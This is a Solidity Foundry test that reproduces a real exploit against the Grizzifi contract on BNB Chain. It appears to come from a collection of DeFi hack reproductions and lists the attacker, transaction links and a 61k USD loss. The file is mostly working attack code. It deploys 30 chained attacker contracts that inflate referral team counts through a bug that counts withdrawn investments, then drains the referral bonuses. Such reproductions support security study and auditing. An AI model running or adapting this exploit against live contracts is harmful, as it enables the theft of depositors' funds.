// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 61k USD
// Attacker : https://bscscan.com/address/0xe2336b08a43f87a4ac8de7707ab7333ba4dbaf7c
// Attack Contract : https://bscscan.com/address/0xEd35746F389177eCD52A16987b2aaC74AA0c1128
// Vulnerable Contract : https://bscscan.com/address/0x21ab8943380b752306abf4d49c203b011a89266b
// Attack Tx : https://bscscan.com/tx/0x36438165d701c883fd9a03631ee0cdeec35a138153720006ab59264db7e075c1

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x21ab8943380b752306abf4d49c203b011a89266b#code

// @Analysis
// Post-mortem : N/A
// Twitter Guy : https://x.com/MetaTrustAlert/status/1955967862276829375
// Hacking God : N/A
pragma solidity ^0.8.0;

address constant GRIZZIFI = 0x21ab8943380B752306aBF4D49C203B011A89266B;
address constant BSC_USD = 0x55d398326f99059fF775485246999027B3197955;

contract Grizzifi is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 57478534 - 1;
    address[] public attackContracts = new address[](30);

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        deal(BSC_USD, address(this), 600 ether);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = BSC_USD;
    }

    function testExploit() public balanceLog {
        //implement exploit code here

        // Step 1: create 30 attack contracts and send 20 bsc-usd to each attack contract
        // https://bscscan.com/tx/0x4302de51c8126e7934da9be1affbde73e5153fe1f9d0200a738a269fe07d22c7
        for (uint256 i = 0; i < 30; i++) {
            AttackContract1 ac1 = new AttackContract1();
            attackContracts[i] = address(ac1);
            IERC20(BSC_USD).transfer(address(ac1), 20 ether);
        }

        // Step 2: run grizzifi.harvestHoney
        // https://bscscan.com/tx/0x36438165d701c883fd9a03631ee0cdeec35a138153720006ab59264db7e075c1

        // The root cause is, in the _incrementUplineTeamCount(), 
        // it checks the `totalInvested` (including withdrawn) instead of active investments
        address regCenter = address(0);
        for (uint256 i = 0; i < 30; i++) {
            address ac1 = attackContracts[i];
            AttackContract1(ac1).init(GRIZZIFI, regCenter);
            regCenter = ac1;
        }

        // Step 3: withdraw
        // 0xdb5296b19693c3c5032abe5c385a4f0cd14e863f3d44f018c1ed318fa20058f7
        for (uint256 i = 0; i < 30; i++) {
            // ignore the Grizzifi: No referral or milestone bonuses to claim error
            try AttackContract1(attackContracts[i]).withdraw(GRIZZIFI) {
            } catch {
            }
        }
    }
}


contract AttackContract1 {
    function init(address owner, address regCenter) public {
        IERC20 bscUsd = IERC20(BSC_USD);
        IGrizzifi grizzifi = IGrizzifi(owner);

        bscUsd.approve(owner, type(uint256).max);
        grizzifi.harvestHoney(0, 10 ether, regCenter);

        AttackContract2 ac2 = new AttackContract2();
        bscUsd.transfer(address(ac2), 10 ether);
        ac2.run(BSC_USD, owner, regCenter);
    }
    function withdraw(address token) public {
        IGrizzifi(token).collectRefBonus();
        IERC20 bscUsd = IERC20(BSC_USD);
        bscUsd.transfer(msg.sender, bscUsd.balanceOf(address(this)));
    }
}

contract AttackContract2 {
    function run(address token, address router0, address router1) public {
        IERC20(token).approve(router0, type(uint256).max);
        IGrizzifi(router0).harvestHoney(0, 10 ether, router1);
    }
}

interface IGrizzifi {
    function harvestHoney(uint256 _planId, uint256 _amount, address _referrer) external;
    function collectRefBonus() external;
}
    